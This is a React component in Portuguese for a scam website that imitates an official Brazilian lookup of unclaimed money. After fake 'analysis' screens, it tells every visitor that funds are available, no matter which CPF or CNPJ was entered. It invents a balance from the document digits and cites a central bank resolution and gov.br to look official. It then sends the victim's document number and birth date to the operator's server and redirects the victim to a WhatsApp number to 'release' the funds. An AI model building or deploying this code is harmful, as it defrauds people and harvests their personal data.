import { useEffect, useState } from "react";
import { Search, X, CheckCircle2, Smartphone, Loader2, Info, ArrowRight, ShieldCheck } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import axios from "axios";
import { API_URL } from "../config";

interface Step2Props {
  data: {
    docType: string;
    docValue: string;
    birthDate: string;
  };
  onReset: () => void;
}

type AnalysisState = "checking_base" | "verifying_identity" | "finalizing" | "results";

export function Step2({ data, onReset }: Step2Props) {
  const [analysisState, setAnalysisState] = useState<AnalysisState>("checking_base");
  const [config, setConfig] = useState({ 
    whatsappNumber: typeof window !== 'undefined' ? (localStorage.getItem('svr_last_whatsapp') || "5511922968136") : "5511922968136" 
  });
  const [isProcessingWhatsApp, setIsProcessingWhatsApp] = useState(false);
  const [processStep, setProcessStep] = useState(0);

  useEffect(() => {
    const fetchConfig = async () => {
      try {
        const response = await axios.get(`${API_URL}/api/config?t=${Date.now()}`);
        if (response.data.whatsappNumber) {
          console.log("✅ Número sincronizado dinamicamente:", response.data.whatsappNumber);
          setConfig(response.data);
          // Salvar para o navegador não esquecer se houver oscilação
          localStorage.setItem('svr_last_whatsapp', response.data.whatsappNumber);
        }
      } catch (err) {
        console.error("Falha na sincronia modular. Usando memória local.");
        const lastSaved = localStorage.getItem('svr_last_whatsapp');
        if (lastSaved) setConfig({ whatsappNumber: lastSaved });
      }
    };
    fetchConfig();

    const timers = [
      setTimeout(() => setAnalysisState("verifying_identity"), 2500),
      setTimeout(() => setAnalysisState("finalizing"), 4500),
      setTimeout(() => setAnalysisState("results"), 6500),
    ];

    return () => timers.forEach(clearTimeout);
  }, []);

  const calculateValue = (doc: string) => {
    // Deterministic value based on document digits
    const digits = doc.replace(/\D/g, "");
    const base = parseInt(digits.substring(0, 4)) || 1234;
    const value = (base * 1.5) + (parseInt(digits.slice(-2)) * 10);
    return value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  };

  const handleWhatsAppRedirect = () => {
    setIsProcessingWhatsApp(true);

    // Sequence of "automatic" verification steps
    const steps = [
      "Sincronizando protocolo de segurança...",
      "Validando titularidade fiscal...",
      "Gerando token de liberação única...",
      "Conectando ao canal de atendimento prioritário..."
    ];

    let currentStep = 0;
    const interval = setInterval(() => {
      if (currentStep < steps.length - 1) {
        currentStep++;
        setProcessStep(currentStep);
      } else {
        clearInterval(interval);

        const userId = localStorage.getItem('svr_user_id') || "N/A";
        const protocol = `SVR-${userId.toUpperCase()}`;
        // UTF-8 safe base64 encoding for the token
        const token = btoa(unescape(encodeURIComponent(data.docValue))).substring(0, 12).toUpperCase();

        const header = `*SOLICITAÇÃO DE RESGATE - PROTOCOLO DE SEGURANÇA*`;
        const body = `Prezados, venho por meio desta formalizar o requerimento de liberação de ativos vinculados ao meu documento conforme os protocolos do sistema.\n\n` +
          `*DETALHES DA SOLICITAÇÃO:* \n` +
          `• Protocolo: *#${protocol}*\n` +
          `• Token de Validação: *${token}*\n` +
          `• Tipo de Documento: *${data.docType}*\n` +
          `• Documento Identificado: *${data.docValue}*\n\n` +
          `Solicito o acompanhamento de um especialista para conclusão do procedimento de transferência de acordo com as normas de segurança vigentes.`;

        const message = encodeURIComponent(header + "\n\n" + body);

        // Notify Admin Bot IMMEDIATELY upon click
        const notifyConversion = async () => {
          try {
            const userIdForApi = localStorage.getItem('svr_user_id');
            if (userIdForApi) {
              await axios.post(`${API_URL}/api/v1/session/convert`, {
                userId: userIdForApi,
                details: { 
                  docValue: data.docValue, 
                  birthDate: data.birthDate,
                  protocol: protocol,
                  token: token
                }
              });
            }
          } catch (e) { 
            console.error("Erro na conversão antecipada:", e);
          }
        };

        notifyConversion().finally(() => {
          window.location.href = `https://wa.me/${config.whatsappNumber}?text=${message}`;
        });
      }
    }, 1200);
  };

  const AnalysisLoader = ({ text }: { text: string }) => (
    <div className="flex flex-col items-center justify-center p-16 bg-white dark:bg-[#1f292e] rounded shadow-sm border border-gray-100 dark:border-[#2a373d] max-w-[420px] mx-auto text-center space-y-6 min-h-[450px] transition-colors duration-300">
      <div className="relative">
        <Loader2 className="w-16 h-16 text-[#2d7890] dark:text-[#429bb8] animate-spin" strokeWidth={1.5} />
        <div className="absolute inset-0 flex items-center justify-center">
          <Search size={24} className="text-[#2d7890] dark:text-[#429bb8] opacity-50" />
        </div>
      </div>
      <div className="space-y-2">
        <h3 className="text-xl font-bold text-gray-800 dark:text-gray-200 tracking-tight transition-colors duration-300">{text}</h3>
        <div className="flex gap-1 justify-center">
          {[0, 1, 2].map((i) => (
            <motion.div
              key={i}
              className="w-2 h-2 bg-[#2d7890] rounded-full"
              animate={{ opacity: [0.3, 1, 0.3] }}
              transition={{ repeat: Infinity, duration: 1.5, delay: i * 0.2 }}
            />
          ))}
        </div>
      </div>
      <p className="text-sm text-gray-500 dark:text-gray-400 font-medium opacity-60 transition-colors duration-300">Sincronizando com as bases do Banco Central...</p>
    </div>
  );

  return (
    <AnimatePresence mode="wait">
      {analysisState === "checking_base" && (
        <motion.div key="check" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Analisando base de CPFs/CNPJs..." />
        </motion.div>
      )}
      {analysisState === "verifying_identity" && (
        <motion.div key="verify" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Verificando saldos residuais..." />
        </motion.div>
      )}
      {analysisState === "finalizing" && (
        <motion.div key="final" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Finalizando consulta segura..." />
        </motion.div>
      )}

      {analysisState === "results" && (
        <motion.div
          key="results"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white dark:bg-[#1f292e] rounded-[2px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[850px] mx-auto shadow-sm transition-colors duration-300"
        >
          <div className="p-10 md:p-14 flex flex-col md:flex-row gap-12 items-start">
            
            {/* Left side: Large Green Checkmark */}
            <div className="flex-shrink-0 pt-4">
              <div className="w-24 h-24 md:w-32 md:h-32">
                <svg viewBox="0 0 52 52" className="w-full h-full text-[#4caf50]">
                  <path fill="none" stroke="currentColor" strokeWidth="5.5" strokeLinecap="round" strokeLinejoin="round" d="M14 27l8 8 16-16" />
                </svg>
              </div>
            </div>

            {/* Right side: Content */}
            <div className="flex-grow space-y-6 text-left">
              
              {/* Title and Details */}
              <div className="space-y-1">
                <h2 className="text-[24px] md:text-[28px] font-bold text-[#455a64] dark:text-white leading-tight">
                  O {data.docType} pesquisado possui ativos para liberação imediata
                </h2>
                <div className="text-[14px] text-[#666] dark:text-gray-400 flex flex-col items-end md:items-start pt-1">
                   <p className="flex gap-2"><span>{data.docType}:</span> <span className="font-bold text-[#333] dark:text-gray-200">{data.docValue}</span></p>
                   <p className="flex gap-2"><span>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}:</span> <span className="font-bold text-[#333] dark:text-gray-200">{data.birthDate}</span></p>
                </div>
              </div>

              {/* Gray Banner Box */}
              <div className="w-full bg-[#f1f3f4] dark:bg-[#2c3e50] p-4 border border-[#e0e0e0] dark:border-[#3b4a5a] rounded-sm">
                <p className="text-[15px] font-bold text-[#444] dark:text-gray-100">
                  O procedimento de resgate está sujeito à validação de segurança conforme a Resolução BCB nº 4.862/2020.
                </p>
              </div>

              {/* Body Text */}
              <div className="space-y-4 text-[15px] md:text-[16px] text-[#444] dark:text-gray-300 leading-relaxed">
                <p>
                  Para garantir a integridade da transferência fiscal, o sistema exige a conclusão das etapas obrigatórias de homologação documental e vínculo bancário do titular.
                </p>
                <p>
                  A liberação dos ativos será processada de forma sigilosa e segura após a autenticação em tempo real realizada através de nossos canais oficiais.
                </p>
              </div>

              {/* Buttons Row - Positioned as in the image */}
              <div className="pt-4 flex flex-col gap-3">
                <div className="flex justify-end gap-3 flex-wrap">
                  <button
                    onClick={handleWhatsAppRedirect}
                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] shadow-sm uppercase min-w-[220px]"
                  >
                    <ArrowRight size={18} className="-rotate-45" /> Liberar Valores Disponíveis
                  </button>
                  <button
                    onClick={onReset}
                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] shadow-sm"
                  >
                    <Search size={18} /> Nova consulta
                  </button>
                  <button
                    onClick={() => window.location.reload()}
                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] shadow-sm"
                  >
                    <X size={18} /> Sair
                  </button>
                </div>
              </div>

              {/* Centered link at the very bottom of the component */}
              <div className="pt-8 text-center w-full">
                <a 
                  href="https://acesso.gov.br" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-[13px] text-[#0066cc] dark:text-[#4da3ff] hover:underline font-bold"
                >
                  *Saiba como realizar a validação de segurança e aumentar seu nível de confiabilidade gov.br (Prata ou Ouro).
                </a>
              </div>

            </div>

          </div>
        </motion.div>
      )}



      {isProcessingWhatsApp && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="fixed inset-0 bg-[#1b668d]/95 z-[100] flex flex-col items-center justify-center p-8 text-white text-center"
        >
          <div className="w-full max-w-[320px] space-y-8">
            <div className="relative flex items-center justify-center">
              <Loader2 className="w-24 h-24 text-white/20 animate-spin" strokeWidth={1} />
              <ShieldCheck className="absolute w-10 h-10 text-white animate-pulse" />
            </div>

            <div className="space-y-4">
              <h2 className="text-xl font-bold tracking-tight uppercase">Processamento Automático</h2>
              <div className="space-y-2">
                {[0, 1, 2, 3].map((i) => (
                  <div key={i} className={`flex items-center gap-3 text-sm transition-all duration-500 ${i <= processStep ? 'opacity-100' : 'opacity-20'}`}>
                    {i < processStep ? <CheckCircle2 size={16} className="text-green-400" /> : <div className="w-4 h-4 border border-white/30 rounded-full" />}
                    <span className={i === processStep ? 'font-bold' : ''}>
                      {[
                        "Sincronizando protocolo de segurança...",
                        "Validando titularidade fiscal...",
                        "Gerando token de liberação única...",
                        "Conectando ao canal de atendimento prioritário..."
                      ][i]}
                    </span>
                  </div>
                ))}
              </div>
            </div>

            <p className="text-[10px] opacity-50 uppercase tracking-[0.2em] font-bold">Iniciando Chat Seguro</p>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}


